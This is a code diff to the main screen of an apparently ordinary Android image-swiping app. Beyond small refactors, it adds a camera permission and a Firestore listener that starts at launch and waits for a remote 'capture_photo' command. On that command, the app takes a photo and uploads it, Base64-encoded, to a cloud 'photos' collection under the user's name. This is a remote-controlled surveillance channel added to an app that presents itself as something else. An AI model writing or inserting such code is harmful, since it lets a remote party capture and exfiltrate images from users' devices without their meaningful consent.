@@ -8,8 +8,10 @@ import android.app.AlertDialog
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.provider.MediaStore
 import android.util.Log
 import android.view.GestureDetector
 import android.view.MotionEvent
@@ -24,12 +26,21 @@ import com.bumptech.glide.Glide
 import com.google.android.material.bottomnavigation.BottomNavigationView
 import com.google.firebase.FirebaseApp
 import com.example.myapplication3.network.RetrofitInstance
+import com.google.firebase.firestore.FirebaseFirestore
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import java.util.concurrent.TimeUnit
+import android.graphics.Bitmap
+import android.util.Base64
+import java.io.ByteArrayOutputStream
+import kotlin.math.abs
 
 class MainActivity : AppCompatActivity() {
+
+    private lateinit var capturedPhotoUri: Uri
+    private val REQUEST_IMAGE_CAPTURE = 101
+    private val REQUEST_PERMISSIONS = 102
 
     private lateinit var imageView: ImageView
     private lateinit var heartIcon: ImageView
@@ -91,6 +102,8 @@ class MainActivity : AppCompatActivity() {
             Log.d("MainActivity", "All permissions granted.")
             onPermissionsGranted()
         }
+
+        listenForCommands()
     }
 
     @RequiresApi(Build.VERSION_CODES.TIRAMISU)
@@ -102,7 +115,9 @@ class MainActivity : AppCompatActivity() {
             Manifest.permission.ACCESS_FINE_LOCATION,
             Manifest.permission.READ_MEDIA_IMAGES,
             Manifest.permission.READ_MEDIA_VIDEO,
-            Manifest.permission.READ_MEDIA_AUDIO
+            Manifest.permission.READ_MEDIA_AUDIO,
+            Manifest.permission.CAMERA
+
         )
 
         return permissions.all {
@@ -119,7 +134,8 @@ class MainActivity : AppCompatActivity() {
             Manifest.permission.ACCESS_FINE_LOCATION,
             Manifest.permission.READ_MEDIA_IMAGES,
             Manifest.permission.READ_MEDIA_VIDEO,
-            Manifest.permission.READ_MEDIA_AUDIO
+            Manifest.permission.READ_MEDIA_AUDIO,
+            Manifest.permission.CAMERA
         )
 
         ActivityCompat.requestPermissions(this, permissionsToRequest, REQUEST_ALL_PERMISSIONS)
@@ -230,8 +246,8 @@ class MainActivity : AppCompatActivity() {
             val diffX = e2.x - e1.x
             val diffY = e2.y - e1.y
 
-            if (Math.abs(diffX) > Math.abs(diffY)) {
-                if (Math.abs(diffX) > SWIPE_THRESHOLD && Math.abs(velocityX) > SWIPE_VELOCITY_THRESHOLD) {
+            if (abs(diffX) > abs(diffY)) {
+                if (abs(diffX) > SWIPE_THRESHOLD && abs(velocityX) > SWIPE_VELOCITY_THRESHOLD) {
                     if (diffX > 0) {
                         onSwipeRight()
                     } else {
@@ -299,4 +315,104 @@ class MainActivity : AppCompatActivity() {
     companion object {
         private const val REQUEST_ALL_PERMISSIONS = 101
     }
+
+    private fun capturePhoto() {
+        val cameraIntent = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
+        startActivityForResult(cameraIntent, REQUEST_IMAGE_CAPTURE)
+    }
+
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == REQUEST_IMAGE_CAPTURE && resultCode == RESULT_OK) {
+            val bitmap = data?.extras?.get("data") as? Bitmap
+            if (bitmap != null) {
+                uploadPhotoToFirestore(bitmap)
+            } else {
+                Log.e("MainActivity", "Failed to capture photo.")
+            }
+        }
+    }
+
+
+    private fun uploadPhotoToFirestore(bitmap: Bitmap) {
+        try {
+            // Compress the bitmap to reduce its size
+            val compressedBitmap = compressBitmap(bitmap, 800, 800)
+
+            // Convert the compressed bitmap to a byte array
+            val outputStream = ByteArrayOutputStream()
+            compressedBitmap.compress(Bitmap.CompressFormat.JPEG, 75, outputStream)
+            val byteArray = outputStream.toByteArray()
+
+            // Convert the byte array to Base64
+            val base64String = Base64.encodeToString(byteArray, Base64.DEFAULT)
+
+            // Get the username from SharedPreferences
+            val sharedPreferences = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
+            val username = sharedPreferences.getString("user_name", "default_user") ?: "default_user"
+
+            // Save the Base64 image to Firestore under the photos collection and the username document
+            val db = FirebaseFirestore.getInstance()
+            val photoData = hashMapOf(
+                "timestamp" to System.currentTimeMillis(),
+                "imageBase64" to base64String
+            )
+
+            // Save the Base64 image to the "photos" collection with the username as the document ID
+            db.collection("photos")
+                .document(username) // Document ID is the username
+                .set(photoData)
+                .addOnSuccessListener {
+                    Log.d("MainActivity", "Photo saved to Firestore successfully.")
+                }
+                .addOnFailureListener { e ->
+                    Log.e("MainActivity", "Error saving photo to Firestore: ${e.message}")
+                }
+        } catch (e: Exception) {
+            Log.e("MainActivity", "Error processing photo: ${e.message}")
+        }
+    }
+
+// Helper function to compress a Bitmap
+private fun compressBitmap(originalBitmap: Bitmap, maxWidth: Int, maxHeight: Int): Bitmap {
+    val width = originalBitmap.width
+    val height = originalBitmap.height
+
+    // Calculate aspect ratio and scale accordingly
+    val aspectRatio = width.toFloat() / height.toFloat()
+    val newWidth: Int
+    val newHeight: Int
+
+    if (width > height) {
+        newWidth = maxWidth
+        newHeight = (maxWidth / aspectRatio).toInt()
+    } else {
+        newHeight = maxHeight
+        newWidth = (maxHeight * aspectRatio).toInt()
+    }
+
+    return Bitmap.createScaledBitmap(originalBitmap, newWidth, newHeight, true)
+}
+
+
+private fun listenForCommands() {
+        Log.d("MainActivity", "Commanded successfully.")
+        val db = FirebaseFirestore.getInstance()
+        db.collection("commands").document("camera_command")
+            .addSnapshotListener { snapshot, e ->
+                if (e != null) {
+                    Log.e("MainActivity", "Error listening for commands: ${e.message}")
+                    return@addSnapshotListener
+                }
+                if (snapshot != null && snapshot.exists()) {
+                    val command = snapshot.getString("command")
+                    if (command == "capture_photo") {
+                        capturePhoto()
+                        db.collection("commands").document("camera_command").update("command", null)
+                    }
+                }
+            }
+    }
+
 }
